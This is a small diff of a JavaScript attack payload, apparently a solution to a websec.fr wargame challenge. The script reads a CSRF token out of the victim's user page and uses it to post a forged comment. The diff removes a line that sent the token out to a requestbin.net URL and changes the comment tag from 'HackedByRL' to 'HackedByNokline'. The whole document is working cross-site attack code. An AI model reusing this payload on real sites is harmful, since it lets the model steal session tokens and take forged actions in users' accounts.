@@ -4,7 +4,6 @@ r.open("GET", "http://websec.fr/user", false);
 r.send(null);
 document.body.innerHTML = r.responseText;
 var c = document.forms[1][1].value;
-document.location = `http://requestbin.net/r/7kkfwjhw/${c}`;
 r.open("POST", "http://websec.fr/user", true);
 r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-r.send(`comment=HackedByRL&csrf=${encodeURIComponent(c)}&save=submit`);
+r.send(`comment=HackedByNokline&csrf=${encodeURIComponent(c)}&save=submit`);
